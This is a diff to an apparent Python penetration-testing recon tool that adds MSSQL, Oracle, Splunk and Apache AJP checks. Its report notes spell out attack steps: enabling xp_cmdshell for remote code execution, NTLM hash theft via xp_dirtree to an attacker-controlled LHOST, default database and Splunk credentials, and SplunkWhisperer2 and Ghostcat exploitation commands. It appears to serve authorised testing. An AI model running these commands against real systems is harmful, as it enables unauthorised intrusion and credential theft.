@@ -869,10 +869,21 @@ def _mssql(ip, service, runner, findings, available):
         findings.cmd(" ".join(cmd2))
         if "[+]" in out2 or "Pwn3d!" in out2:
             findings.bullet("**SA blank password: VALID**")
-            findings.note("RCE via xp_cmdshell: `impacket-mssqlclient sa:@{ip}` → `EXEC xp_cmdshell 'whoami'`")
+            findings.add_summary(f"MSSQL: SA blank password valid on {ip} — xp_cmdshell RCE")
+            findings.note(
+                f"RCE: `impacket-mssqlclient sa:@{ip}` → "
+                "`EXEC sp_configure 'show advanced options',1; RECONFIGURE; "
+                "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'`"
+            )
         else:
             findings.bullet("SA blank password: invalid")
 
+    findings.note(
+        "After authentication: check for linked servers — "
+        "`EXEC sp_linkedservers` → `EXEC ('EXEC xp_cmdshell ''whoami''') AT [<linked_server>]`. "
+        "Steal NTLM hash: `EXEC xp_dirtree '\\\\LHOST\\share'` (run Responder first). "
+        "MSSQL log may contain creds typed in username field — check ERRORLOG."
+    )
     return []
 
 
@@ -884,6 +895,18 @@ def _oracle(ip, service, runner, findings, available):
     out = runner.run(cmd, f"oracle_{service.port}_nmap", timeout=120)
     findings.cmd(" ".join(cmd))
     findings.code_block(_trim(out))
+
+    # Extract SID from nmap output
+    sids = re.findall(r"Service Info:.*?SID[:\s]+(\S+)", out, re.IGNORECASE)
+    sid_str = ", ".join(sids) if sids else "XE, ORCL, DB, ORACLE"
+
+    findings.note(
+        f"Connect: `sqlplus user/password@{ip}/{sid_str.split(',')[0].strip()}` "
+        f"(common SIDs: {sid_str}). "
+        "Default creds: sys/change_on_install, system/manager, scott/tiger, dbsnmp/dbsnmp. "
+        "Enumerate SIDs: `oscanner -s {ip} -P {service.port}`. "
+        "Full scan (PT ONLY): `odat all -s {ip}`"
+    )
     return []
 
 
@@ -1264,6 +1287,73 @@ def _tftp(ip, service, runner, findings, available):
     return []
 
 
+# ── Splunk (8000 web, 8089 REST/UF management) ───────────────────────────────
+
+def _splunk(ip, service, runner, findings, available):
+    port = service.port
+    scheme = "https" if port == 8089 else "http"
+    base = f"{scheme}://{ip}:{port}"
+
+    findings.h4(f"Splunk ({'Management API' if port == 8089 else 'Web UI'})")
+
+    # Version check via REST API (no auth needed on many installations)
+    cmd = ["curl", "-sk", "--max-time", "10", f"{base}/services/server/info?output_mode=json"]
+    out = runner.run(cmd, f"splunk_{port}_info")
+    findings.cmd(" ".join(cmd))
+
+    if '"version"' in out or '"build"' in out:
+        findings.bullet("**Splunk REST API accessible (no auth)**")
+        m = re.search(r'"version"\s*:\s*"([^"]+)"', out)
+        if m:
+            findings.bullet(f"Splunk version: `{m.group(1)}`")
+            findings.add_summary(f"Splunk {m.group(1)} API accessible on port {port}")
+    else:
+        # Check web UI login page
+        r = subprocess.run(
+            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
+             "-w", "%{http_code}", f"http://{ip}:8000/en-US/account/login"],
+            capture_output=True, text=True,
+        )
+        if r.stdout.strip() in ("200", "302"):
+            findings.bullet(f"**Splunk Web UI accessible:** `http://{ip}:8000/en-US/account/login`")
+            findings.add_summary(f"Splunk Web UI on port 8000 — test admin/changeme")
+        else:
+            findings.bullet("Splunk: no unauthenticated access — auth required")
+
+    findings.note(
+        "Default creds: admin/changeme. "
+        "With admin on REST API (8089): Universal Forwarder RCE via malicious app deployment. "
+        "Tool: SplunkWhisperer2 (`python3 PySplunkWhisperer2_remote.py --host {ip} --port 8089 "
+        "--username admin --password changeme --payload 'id'`)"
+    )
+    return []
+
+
+# ── Apache AJP (8009) — Ghostcat CVE-2020-1938 ───────────────────────────────
+
+def _ajp(ip, service, runner, findings, available):
+    port = service.port
+
+    findings.h4("Apache AJP (Ghostcat)")
+
+    cmd = ["nmap", "-sV", "-p", str(port), "--script", "ajp-headers,ajp-request", ip]
+    out = runner.run(cmd, f"ajp_{port}_nmap", timeout=30)
+    findings.cmd(" ".join(cmd))
+    findings.code_block(_trim(out))
+
+    findings.bullet(f"**AJP connector on port {port} — check for Ghostcat (CVE-2020-1938)**")
+    findings.add_summary(
+        f"Apache AJP on port {port} — Ghostcat CVE-2020-1938: "
+        "unauthenticated file read from Tomcat webroot"
+    )
+    findings.note(
+        "Ghostcat PoC: `python3 ghostcat.py {ip}` — reads /WEB-INF/web.xml by default. "
+        "If file upload exists: upload JSP, include via Ghostcat → RCE. "
+        "searchsploit: `searchsploit Ghostcat` | ExploitDB: EDB-48143"
+    )
+    return []
+
+
 # ── Jenkins agent port (50000) ────────────────────────────────────────────────
 
 def _jenkins(ip, service, runner, findings, available):
@@ -1337,6 +1427,8 @@ _PORT_MAP: dict[int, object] = {
     5985:  _winrm,
     5986:  _winrm,
     6379:  _redis,
+    8009:  _ajp,
+    8089:  _splunk,
     9200:  _elasticsearch,
     9300:  _elasticsearch,
     11211: _memcached,
@@ -1372,6 +1464,9 @@ _NAME_MAP: dict[str, object] = {
     "ipmi":          _ipmi,
     "jenkins":       _jenkins,
     "mongodb":       _mongodb,
+    "splunk":        _splunk,
+    "ajp":           _ajp,
+    "apache-jserv":  _ajp,
 }
 
 
